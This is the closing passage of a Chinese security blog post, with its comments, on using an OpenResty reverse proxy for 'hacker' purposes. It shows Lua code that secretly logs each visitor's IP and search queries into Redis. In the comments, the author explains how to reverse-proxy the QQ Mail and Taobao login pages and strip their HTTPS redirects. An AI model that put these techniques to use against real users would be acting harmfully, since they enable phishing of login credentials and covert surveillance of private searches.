+<span class="kr">if</span> <span class="ow">not</span> <span class="n">ok</span> <span class="kr">then</span>
+    <span class="n">ngx</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">ngx</span><span class="p">.</span><span class="n">WARN</span><span class="p">,</span> <span class="s2">&quot;failed to connect: &quot;</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+    <span class="kr">return</span>
+<span class="kr">end</span>
+<span class="n">ok</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">red</span><span class="p">:</span><span class="nb">select</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="kr">if</span> <span class="ow">not</span> <span class="n">ok</span> <span class="kr">then</span>
+    <span class="n">ngx</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s2">&quot;failed to select: &quot;</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+    <span class="kr">return</span>
+<span class="kr">end</span>
+
+<span class="kd">local</span> <span class="n">args</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
+<span class="kr">if</span> <span class="n">args</span><span class="p">[</span><span class="s2">&quot;q&quot;</span><span class="p">]</span> <span class="kr">then</span>
+    <span class="kd">local</span> <span class="n">key</span> <span class="o">=</span> <span class="n">getClientIp</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">red</span><span class="p">:</span><span class="n">sadd</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="s2">&quot;q&quot;</span><span class="p">])</span>
+<span class="kr">end</span> 
+</pre></div>
+
+
+<p>再将location /result 解析到如下lua脚本中，读取redis显示结果：</p>
+<div class="codehilite"><pre><span></span><span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="kd">local</span> <span class="n">ips</span> <span class="o">=</span> <span class="n">red</span><span class="p">:</span><span class="n">keys</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">)</span>
+<span class="kr">for</span> <span class="n">k1</span><span class="p">,</span><span class="n">ip</span> <span class="kr">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">ips</span><span class="p">)</span> <span class="kr">do</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="n">ip</span> <span class="o">..</span> <span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="kd">local</span> <span class="n">words</span> <span class="o">=</span> <span class="n">red</span><span class="p">:</span><span class="n">smembers</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+    <span class="kr">for</span> <span class="n">k2</span><span class="p">,</span><span class="n">word</span> <span class="kr">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">words</span><span class="p">)</span> <span class="kr">do</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">Search: &quot;</span> <span class="o">..</span> <span class="n">word</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="kr">end</span>
+<span class="kr">end</span>
+<span class="n">ngx</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">content_type</span> <span class="o">=</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">;</span>
+<span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+<span class="kr">return</span>
+</pre></div>
+
+
+<p>最后效果如图所示（ <a href="https://xdsec.mhz.pw/result"><a href="https://xdsec.mhz.pw/result">https://xdsec.mhz.pw/result</a></a> ）：</p>
+<p><a href="../content/uploadfile/201505/70a31433046111.png"><img alt="image033.png" src="../content/uploadfile/201505/thum-70a31433046111.png" /></a></p>
+<h2 id="0x07"><a class="toclink" href="#0x07">0x07 总结与引用</a></h2>
+<p>通过这篇文章，我简单地讲了openresty一些有意思的玩法。</p>
+<p>说白了，就是借助其能够截取数据包的能力，来做很多只有hacker才想做的事情。除了文中说到的玩法（钓鱼、用户隐私探测），我还想到一些openresty可以做的大事：</p>
+<ol>
+<li>蜜罐：利用lua自动截取数据包中的0day并进行分析。</li>
+<li>流量分析与漏洞自动化挖掘：将目标网站反代下来，正常浏览使用。lua在后端截取数据包并交给各种自动化分析工具分析。</li>
+<li>高级服务的负载均衡：nginx 1.9后代理模块被加入内核，那时候我们甚至可以用openresty作为shadowsocks的前端服务器，作负载均衡。利用lua配置多用户shadowsocks环境，让shadowsocks多用户不再局限于端口与密码，而变成一个host+username+password认证的形式。 </li>
+</ol>
+<p>当然openresty的能力绝不仅仅是如此，还是最开始说的，openresty是一个全功能web服务器。</p>
+<p>但作为一个hacker，我往往去先挖掘这里面最有意思的一些内容，也就是我上面说的。</p>
+<p>如果诸君有兴趣深入研究，都可以和我一起探索。</p>
+<p>本文参考资料：</p>
+<p><a href=""><a href="https://github.com/openresty/lua-nginx-module">https://github.com/openresty/lua-nginx-module</a></a></p>
+<p><a href="http://openresty.org/"><a href="http://openresty.org/">http://openresty.org/</a></a></p>
+<p><a href="https://github.com/openresty/lua-resty-redis"><a href="https://github.com/openresty/lua-resty-redis">https://github.com/openresty/lua-resty-redis</a></a></p>
+<p><a href="https://github.com/brimworks/lua-zlib"><a href="https://github.com/brimworks/lua-zlib">https://github.com/brimworks/lua-zlib</a> </a></p>
+<p><a href="http://wrfly.kfd.me/Nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/"><a href="http://wrfly.kfd.me/Nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/">http://wrfly.kfd.me/Nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/</a></a> （学弟的博客）</p>
+<p><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html"><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html">http://nginx.org/en/docs/http/ngx_http_core_module.html</a></a></p>
+<p><a href="http://www.4byte.cn/question/463833/does-lua-optimize-the-operator.html"><a href="http://www.4byte.cn/question/463833/does-lua-optimize-the-operator.html">http://www.4byte.cn/question/463833/does-lua-optimize-the-operator.html</a></a></p>
+<p>我推荐一些nginx/lua的相关资料与我关注的lua项目：</p>
+<p><a href="https://github.com/leafo/moonscript"><a href="https://github.com/leafo/moonscript">https://github.com/leafo/moonscript</a></a></p>
+<p><a href="https://github.com/leafo/lapis"><a href="https://github.com/leafo/lapis">https://github.com/leafo/lapis</a> </a></p>
+<p><a href="https://github.com/loveshell/ngx_lua_waf"><a href="https://github.com/loveshell/ngx_lua_waf">https://github.com/loveshell/ngx_lua_waf</a></a></p>
+<p><a href="http://jb.wanpin123.com/lua/"><a href="http://jb.wanpin123.com/lua/">http://jb.wanpin123.com/lua/</a></a></p>
+<p>（这段时间，文中的案例均可直接访问，看官可以自行测试。）</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
+                
+                    <a href="../tag/lua.html">lua</a>
+                
+                    <a href="../tag/nginx.html">nginx</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 12 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3249">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/a36749d27a7ada93a1d4bbf0dcf2d96a.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.360doc.com/content/13/1001/01/1542811_318306455.shtml" target="_blank" rel="nofollow noopener">fyyilu</a></div>
+                    <p>openresty有公司用来做web应用服务器么，是epenresty只是用来做反待而已</p>
+                    <span class="comment-time">时间: 2018-12-10 10:13</span>
+                    <span class="comment-reply"><a href="#comment-3249" onclick="reply_to('3249','fyyilu')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2814">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">小明</a></div>
+                    <p>再将location /result 解析到如下lua脚本中，读取redis显示结果：<br>大哥。怎么弄？教我。跪求</p>
+                    <span class="comment-time">时间: 2017-07-10 17:05</span>
+                    <span class="comment-reply"><a href="#comment-2814" onclick="reply_to('2814','小明')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2442">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/2d4a642fe8a3b0e1752995674f03b7ba.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://i-fanr.com" target="_blank" rel="nofollow noopener">Timfan</a></div>
+                    <p>博主棒棒的！</p>
+                    <span class="comment-time">时间: 2016-09-18 22:03</span>
+                    <span class="comment-reply"><a href="#comment-2442" onclick="reply_to('2442','Timfan')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2440">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/58be6b422d687bc539f275678c6d4dbe.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">瑞瑞哥</a></div>
+                    <p>您好，我想请问下你 了解怎么反向代理到  有道云笔记吗？<br>我最近搞这个头疼得要死，自己折腾差不多了,http https 都配置了<br><br>我的配置文件如下： <br>server {<br> 13         listen 8081 default backlog=2048;<br> 14 <br> 15         resolver 8.8.8.8;<br> 16         server_name  *.ruiruige.top 127.0.0.1;<br> 17 <br> 18         location ~ /(.*)$ {<br> 19             proxy_pass http://note.youdao.com;<br> 20             proxy_redirect default;<br> 21             proxy_redirect https://note.youdao.com/ https://$host/;<br> 22 <br> 23             proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;<br> 24             proxy_pass_header Server;<br> 25 <br> 26             proxy_set_header Host $proxy_host;<br> 27             proxy_set_header referer $scheme://$proxy_host$request_uri;<br> 28             proxy_cookie_domain youdao.com 127.0.0.1;<br> 29 <br> 30             proxy_set_header X-Real-IP $remote_addr;<br> 31             proxy_set_header X-Scheme $scheme;<br> 32             proxy_set_header Accept-Encoding &quot;&quot;;<br> 33 <br> 34             sub_filter note.youdao.com 127.0.0.1;<br> 35             }<br> 36             error_page   500 502 503 504  /50x.html;<br> 37     }<br> 38 <br> 39      server {<br> 40         listen 443 ssl;<br> 41 <br> 42         ssl_certificate /etc/nginx/1__bundle.crt;<br> 43         ssl_certificate_key /etc/nginx/re.key;<br> 44 <br> 45         resolver 8.8.8.8;<br> 46         server_name  127.0.0.1;<br> 47 <br> 48         location ~ /(.*)$ {<br> 49             proxy_pass https://note.youdao.com;<br> 50             proxy_redirect default;<br> 51             proxy_redirect http://note.youdao.com/ http://$host:8081/;<br> 52 <br> 53             proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;<br> 54             proxy_pass_header Server;<br> 55 <br> 56             proxy_set_header Host $proxy_host;<br> 57             proxy_set_header referer $scheme://$proxy_host$request_uri;<br> 58             proxy_cookie_domain youdao.com 127.0.0.1;<br> 59 <br> 60             proxy_set_header X-Real-IP $remote_addr;<br> 61             proxy_set_header X-Scheme $scheme;<br> 62             proxy_set_header Accept-Encoding &quot;&quot;;<br> 63 <br> 64             sub_filter note.youdao.com 127.0.0.1;<br> 65             }<br> 66             error_page   500 502 503 504  /50x.html;<br> 67     }<br><br><br>点击 127.0.0.1 实际反代 note.youdao.com    没问题<br>然后点右上角的登录网页版<br>系统自动 127.0.0.1/web   实际反代 note.youdao.com/web  也没问题<br>系统自动补全后面的斜杠<br>127.0.0.1/web/   实际反代 note.youdao.com/web/   还是没问题<br>然后服务器端发送301 到HTTPS<br>我这边也能 https://127.0.0.1/web/    实际反代 https://note.youdao.com/web/   还是没问题<br><br>可是访问 https://note.youdao.com/web/ 后就有问题了，有个画面一闪而过说“我们服务器出了点问题 马上给你解决”  然后就跳转到 note.youdao.com自带的登录界面了<br><br>请问您知道是那里出错了吗？<br>我host 设置了  referer也写成当前访问的url了。。。</p>
+                    <span class="comment-time">时间: 2016-09-17 13:44</span>
+                    <span class="comment-reply"><a href="#comment-2440" onclick="reply_to('2440','瑞瑞哥')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2441">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@瑞瑞哥：可能是JavaScript检测了当前页面的域名，前端肯定有很多需要改的。</p>
+                    <span class="comment-time">时间: 2016-09-18 13:19</span>
+                    <span class="comment-reply"><a href="#comment-2441" onclick="reply_to('2441','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2104">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人f</a></div>
+                    <p>你好，请教一下反代QQ邮箱时，怎么将https降为http的，网上查到的都是需要证书才能代理https</p>
+                    <span class="comment-time">时间: 2015-06-03 15:59</span>
+                    <span class="comment-reply"><a href="#comment-2104" onclick="reply_to('2104','路人f')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2105">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@路人f：直接proxy_pass https://mail.qq.com 就可以了，不用加证书。</p>
+                    <span class="comment-time">时间: 2015-06-03 17:39</span>
+                    <span class="comment-reply"><a href="#comment-2105" onclick="reply_to('2105','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2108">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人f</a></div>
+                    <p>@phithon：但我用这种方式代理login.taobao.com时，先显示了下登录界面，但下一秒就跳转到https://login.taobao.com了，是因为淘宝限制必须https吗</p>
+                    <span class="comment-time">时间: 2015-06-04 10:15</span>
+                    <span class="comment-reply"><a href="#comment-2108" onclick="reply_to('2108','路人f')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2112">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@路人f：看具体情况，但肯定是有解的。因为反代的时候，nginx向淘宝请求的时候用的是https。<br>首先，如果我不做任何处理的话，QQ邮箱也会强制跳转到https。但我发现他是前端进行的跳转，于是我把跳转的javascript代码给中间去掉了。淘宝可能是这样。<br>要不就和谷歌一样，检查了host，如果host不是login.taobao.com就强制跳转。<br>login.taobao.com我没看过，你说的这种情况应该是前端用javascript进行跳转的。</p>
+                    <span class="comment-time">时间: 2015-06-04 12:59</span>
+                    <span class="comment-reply"><a href="#comment-2112" onclick="reply_to('2112','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2119">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人f</a></div>
+                    <p>@phithon：ok~~多谢博主耐心指导~~~</p>
+                    <span class="comment-time">时间: 2015-06-08 15:21</span>
+                    <span class="comment-reply"><a href="#comment-2119" onclick="reply_to('2119','路人f')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2098">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/29aa08b88f27fd03a82ca84b0f7009a3.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人丁</a></div>
+                    <p>谢谢分享。apache的mod_substitute可以在反代时自动处理gzip。</p>
+                    <span class="comment-time">时间: 2015-06-01 08:51</span>
+                    <span class="comment-reply"><a href="#comment-2098" onclick="reply_to('2098','路人丁')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2097">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人甲</a></div>
+                    <p>P牛你这是强行要整人啊~</p>
+                    <span class="comment-time">时间: 2015-05-31 14:49</span>
+                    <span class="comment-reply"><a href="#comment-2097" onclick="reply_to('2097','路人甲')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="7acd971e1dcfd999d6b137149c1e4576e25072e5" />
+</div><div class="col-6">
+<img src="../captcha/image/7acd971e1dcfd999d6b137149c1e4576e25072e5/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="359" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="4NgjugQVdgW8MnFUQfBPusIrs7ctCZ8AQlEa2lrEBCaRkVtiSgyArVLwNutEbBkS">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="../PENETRATION/javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="../PENETRATION/discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
+        
+        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
+        
+        <a rel="tag" href="../tag/2019.html">2019</a>
+        
+        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
+        
+        <a rel="tag" href="../tag/php.html">php</a>
+        
+        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
+        
+        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
+        
+        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
+        
+        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
+        
+        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/%E9%98%BB%E6%AD%A2%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C.html">阻止脚本运行</a>
+        
+        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
+        
+        <a rel="tag" href="../tag/django.html">django</a>
+        
+        <a rel="tag" href="../tag/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0.html">断点续传</a>
+        
+        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
+        
+        <a rel="tag" href="../tag/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html">信息泄露</a>
+        
+        <a rel="tag" href="../tag/getshell.html">getshell</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>
+        
+        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
+        
+        <a rel="tag" href="../tag/API%E5%87%BD%E6%95%B0.html">API函数</a>
+        
+        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
+        
+        <a rel="tag" href="../tag/webshell.html">webshell</a>
+        
+        <a rel="tag" href="../tag/%E8%84%B1%E8%A3%A4.html">脱裤</a>
+        
+        <a rel="tag" href="../tag/SQL.html">SQL</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="../PENETRATION/detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="../PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="../PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
